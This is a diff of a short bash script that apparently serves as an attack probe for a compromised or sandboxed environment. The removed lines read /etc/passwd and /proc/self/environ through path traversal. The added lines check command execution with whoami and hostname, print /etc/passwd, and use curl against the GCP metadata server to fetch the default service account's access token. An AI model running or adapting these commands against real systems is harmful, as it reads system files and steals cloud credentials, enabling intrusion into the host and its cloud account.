@@ -1,8 +1,12 @@
 #!/bin/bash
-cat ../../../../../../../etc/passwd
 
-cat ../../../../../../../proc/self/environ
+echo "[+] Checking basic command execution:"
+whoami
+hostname
 
-cat ../../../../../../../proc/self/stat
+echo "[+] /etc/passwd contents:"
+cat /etc/passwd
 
-cat ../../../../../../../proc/self/status
+echo "[+] Trying to access GCP metadata:"
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
